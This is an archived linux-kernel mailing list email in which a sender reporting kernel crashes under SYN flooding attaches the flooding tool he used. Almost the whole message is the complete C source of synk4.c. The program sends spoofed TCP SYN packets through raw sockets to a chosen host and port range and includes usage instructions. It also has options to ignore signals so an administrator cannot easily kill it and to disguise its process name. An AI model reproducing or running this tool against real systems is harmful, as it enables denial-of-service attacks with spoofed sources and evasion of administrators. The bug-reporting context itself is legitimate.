Return-Path: <owner-linux-kernel-outgoing@vger.rutgers.edu>
Received: by vger.rutgers.edu via listexpand id <S154256AbQBNN0b>; Mon, 14 Feb 2000 08:26:31 -0500
Received: by vger.rutgers.edu id <S153917AbQBNNOq>; Mon, 14 Feb 2000 08:14:46 -0500
Received: from Tvc.CODEC.Ro ([193.230.240.21]:2030 "EHLO tvc.codec.ro") by vger.rutgers.edu with ESMTP id <S154187AbQBNMoK>; Mon, 14 Feb 2000 07:44:10 -0500
Date: Mon, 14 Feb 2000 18:42:47 +0200
From: Catalin Muresan <cata@codec.ro>
To: linux-kernel@vger.rutgers.edu
Subject: kernels 2.4.4[2345] crash when flooded with synk4.c
Message-ID: <20000214184247.A28162@codec.ro>
Mime-Version: 1.0
Content-Type: multipart/mixed; boundary=cWoXeonUoKmBZSoM
X-Mailer: Mutt 0.95.4us
X-Operating-System: Linux 2.2.13-tvcs i586
Organisation: CODEC Electronic Products
Sender: owner-linux-kernel@vger.rutgers.edu


--cWoXeonUoKmBZSoM
Content-Type: text/plain; charset=us-ascii


	oops, I forgot to attach the source.

-- 
 Catalin Muresan
 CODEC Electronic Products
 Internet Services Department
 1916723.63 1747895.57

--cWoXeonUoKmBZSoM
Content-Type: text/plain; charset=us-ascii
Content-Disposition: attachment; filename="synk4.c"
Content-Transfer-Encoding: quoted-printable

/* Syn Flooder by Zakath
 * TCP Functions by trurl_ (thanks man).
 * Some more code by Zakath.
 * Speed/Misc Tweaks/Enhancments -- ultima
 * Nice Interface -- ultima
 * Random IP Spoofing Mode -- ultima
 * How To Use:
 * Usage is simple. srcaddr is the IP the packets will be spoofed from.
 * dstaddr is the target machine you are sending the packets to.
 * low and high ports are the ports you want to send the packets to.
 * Random IP Spoofing Mode: Instead of typing in a source address,=20
 * just use '0'. This will engage the Random IP Spoofing mode, and
 * the source address will be a random IP instead of a fixed ip.
 * Released: [4.29.97]
 *  To compile: cc -o synk4 synk4.c
 *=20
 */
#include <signal.h>
#include <stdio.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <linux/ip.h>
#include <linux/tcp.h>
/* These can be handy if you want to run the flooder while the admin is on
 * this way, it makes it MUCH harder for him to kill your flooder */
/* Ignores all signals except Segfault */
// #define HEALTHY
/* Ignores Segfault */
// #define NOSEGV
/* Changes what shows up in ps -aux to whatever this is defined to */
// #define HIDDEN "vi .cshrc"
#define SEQ 0x28376839
#define getrandom(min, max) ((rand() % (int)(((max)+1) - (min))) + (min))

unsigned long send_seq, ack_seq, srcport;
char flood =3D 0;
int sock, ssock, curc, cnt;

/* Check Sum */
unsigned short ip_sum(addr, len)
u_short *addr;
int len;
{
	register int nleft =3D len;
	register u_short *w =3D addr;
	register int sum =3D 0;
	u_short answer =3D 0;

	while (nleft > 1) {
		sum +=3D *w++;
		nleft -=3D 2;
	}
	if (nleft =3D=3D 1) {
		*(u_char *) (&answer) =3D *(u_char *) w;
		sum +=3D answer;
	}
	sum =3D (sum >> 16) + (sum & 0xffff);	/* add hi 16 to low 16 */
	sum +=3D (sum >> 16);			/* add carry */
	answer =3D ~sum;				/* truncate to 16 bits */
	return (answer);
}
void sig_exit(int crap)
{
#ifndef HEALTHY
	printf("=1B[H=1B[JSignal Caught. Exiting Cleanly.\n");
	exit(crap);
#endif
}
void sig_segv(int crap)
{
#ifndef NOSEGV
	printf("=1B[H=1B[JSegmentation Violation Caught. Exiting Cleanly.\n");
	exit(crap);
#endif
}

unsigned long getaddr(char *name)
{
	struct hostent *hep;

	hep =3D gethostbyname(name);
	if (!hep) {
		fprintf(stderr, "Unknown host %s\n", name);
		exit(1);
	}
	return *(unsigned long *) hep->h_addr;
}


void send_tcp_segment(struct iphdr *ih, struct tcphdr *th, char *data,
					  int dlen)
{
	char buf[65536];
	struct {					/* rfc 793 tcp pseudo-header */
		unsigned long saddr, daddr;
		char mbz;
		char ptcl;
		unsigned short tcpl;
	} ph;

	struct sockaddr_in sin;		/* how necessary is this, given that the destinat=
ion
								   address is already in the ip header? */

	ph.saddr =3D ih->saddr;
	ph.daddr =3D ih->daddr;
	ph.mbz =3D 0;
	ph.ptcl =3D IPPROTO_TCP;
	ph.tcpl =3D htons(sizeof(*th) + dlen);

	memcpy(buf, &ph, sizeof(ph));
	memcpy(buf + sizeof(ph), th, sizeof(*th));
	memcpy(buf + sizeof(ph) + sizeof(*th), data, dlen);
	memset(buf + sizeof(ph) + sizeof(*th) + dlen, 0, 4);
	th->check =3D ip_sum(buf, (sizeof(ph) + sizeof(*th) + dlen + 1) & ~1);

	memcpy(buf, ih, 4 * ih->ihl);
	memcpy(buf + 4 * ih->ihl, th, sizeof(*th));
	memcpy(buf + 4 * ih->ihl + sizeof(*th), data, dlen);
	memset(buf + 4 * ih->ihl + sizeof(*th) + dlen, 0, 4);

	ih->check =3D ip_sum(buf, (4 * ih->ihl + sizeof(*th) + dlen + 1) & ~1);
	memcpy(buf, ih, 4 * ih->ihl);

	sin.sin_family =3D AF_INET;
	sin.sin_port =3D th->dest;
	sin.sin_addr.s_addr =3D ih->daddr;

	if (sendto
		(ssock, buf, 4 * ih->ihl + sizeof(*th) + dlen, 0, &sin,
		 sizeof(sin)) < 0) {
		printf("Error sending syn packet.\n");
		perror("");
		exit(1);
	}
}

unsigned long spoof_open(unsigned long my_ip, unsigned long their_ip,
						 unsigned short port)
{
	int i, s;
	struct iphdr ih;
	struct tcphdr th;
	struct sockaddr_in sin;
	int sinsize;
	unsigned short myport =3D 6969;
	char buf[1024];
	struct timeval tv;

	ih.version =3D 4;
	ih.ihl =3D 5;
	ih.tos =3D 0;					/* XXX is this normal? */
	ih.tot_len =3D sizeof(ih) + sizeof(th);
	ih.id =3D htons(random());
	ih.frag_off =3D 0;
	ih.ttl =3D 30;
	ih.protocol =3D IPPROTO_TCP;
	ih.check =3D 0;
	ih.saddr =3D my_ip;
	ih.daddr =3D their_ip;

	th.source =3D htons(srcport);
	th.dest =3D htons(port);
	th.seq =3D htonl(SEQ);
	th.doff =3D sizeof(th) / 4;
	th.ack_seq =3D 0;
	th.res1 =3D 0;
	th.fin =3D 0;
	th.syn =3D 1;
	th.rst =3D 0;
	th.psh =3D 0;
	th.ack =3D 0;
	th.urg =3D 0;
//  th.res2=3D0;
	th.window =3D htons(65535);
	th.check =3D 0;
	th.urg_ptr =3D 0;

	gettimeofday(&tv, 0);

	send_tcp_segment(&ih, &th, "", 0);

	send_seq =3D SEQ + 1 + strlen(buf);
}
void upsc()
{
	int i;
	char schar[5] =3D "|/-\\";

	printf("=1B[H=1B[1;30m[=1B[1;31m%c=1B[1;30m]=1B[0m %d", schar[cnt], curc);
	cnt++;
	cnt %=3D 4;
	for (i =3D 0; i < 26; i++) {
		i++;
		curc++;
	}
}
void init_signals()
{
	// Every Signal known to man. If one gives you an error, comment it out!
	signal(SIGHUP, sig_exit);
	signal(SIGINT, sig_exit);
	signal(SIGQUIT, sig_exit);
	signal(SIGILL, sig_exit);
	signal(SIGTRAP, sig_exit);
	signal(SIGIOT, sig_exit);
	signal(SIGBUS, sig_exit);
	signal(SIGFPE, sig_exit);
	signal(SIGKILL, sig_exit);
	signal(SIGUSR1, sig_exit);
	signal(SIGSEGV, sig_segv);
	signal(SIGUSR2, sig_exit);
	signal(SIGPIPE, sig_exit);
	signal(SIGALRM, sig_exit);
	signal(SIGTERM, sig_exit);
	signal(SIGCHLD, sig_exit);
	signal(SIGCONT, sig_exit);
	signal(SIGSTOP, sig_exit);
	signal(SIGTSTP, sig_exit);
	signal(SIGTTIN, sig_exit);
	signal(SIGTTOU, sig_exit);
	signal(SIGURG, sig_exit);
	signal(SIGXCPU, sig_exit);
	signal(SIGXFSZ, sig_exit);
	signal(SIGVTALRM, sig_exit);
	signal(SIGPROF, sig_exit);
	signal(SIGWINCH, sig_exit);
	signal(SIGIO, sig_exit);
	signal(SIGPWR, sig_exit);
}
main(int argc, char **argv)
{
	int i, x, max, floodloop, diff, urip, a, b, c, d;
	unsigned long them, me_fake;
	unsigned lowport, highport;
	char buf[1024], *junk;

	init_signals();
#ifdef HIDDEN
	for (i =3D argc - 1; i >=3D 0; i--)
		/* Some people like bzero...i prefer memset :) */
		memset(argv[i], 0, strlen(argv[i]));
	strcpy(argv[0], HIDDEN);
#endif

	if (argc < 5) {
		printf("Usage: %s srcaddr dstaddr low high\n", argv[0]);
		printf("    If srcaddr is 0, random addresses will be used\n\n\n");

		exit(1);
	}
	if (atoi(argv[1]) =3D=3D 0)
		urip =3D 1;
	else
		me_fake =3D getaddr(argv[1]);
	them =3D getaddr(argv[2]);
	lowport =3D atoi(argv[3]);
	highport =3D atoi(argv[4]);
	srandom(time(0));
	ssock =3D socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if (ssock < 0) {
		perror("socket (raw)");
		exit(1);
	}
	sock =3D socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
	if (sock < 0) {
		perror("socket");
		exit(1);
	}
	junk =3D (char *) malloc(1024);
	max =3D 1500;
	i =3D 1;
	diff =3D (highport - lowport);

	if (diff > -1) {
		printf
			("=1B[H=1B[J\n\nCopyright (c) 1980, 1983, 1986, 1988, 1990, 1991 The Reg=
ents of the University\n of California. All Rights Reserved.");
		for (i =3D 1; i > 0; i++) {
			srandom((time(0) + i));
			srcport =3D getrandom(1, max) + 1000;
			for (x =3D lowport; x <=3D highport; x++) {
				if (urip =3D=3D 1) {
					a =3D getrandom(0, 255);
					b =3D getrandom(0, 255);
					c =3D getrandom(0, 255);
					d =3D getrandom(0, 255);
					sprintf(junk, "%i.%i.%i.%i", a, b, c, d);
					me_fake =3D getaddr(junk);
				}

				spoof_open( /*0xe1e26d0a */ me_fake, them, x);
				/* A fair delay. Good for a 28.8 connection */
				//  usleep(300);

				if (!(floodloop =3D (floodloop + 1) % (diff + 1))) {
					upsc();
					fflush(stdout);
				}
			}
		}
	} else {
		printf("High port must be greater than Low port.\n");
		exit(1);
	}
}

--cWoXeonUoKmBZSoM--

-
To unsubscribe from this list: send the line "unsubscribe linux-kernel" in
the body of a message to majordomo@vger.rutgers.edu
Please read the FAQ at http://www.tux.org/lkml/
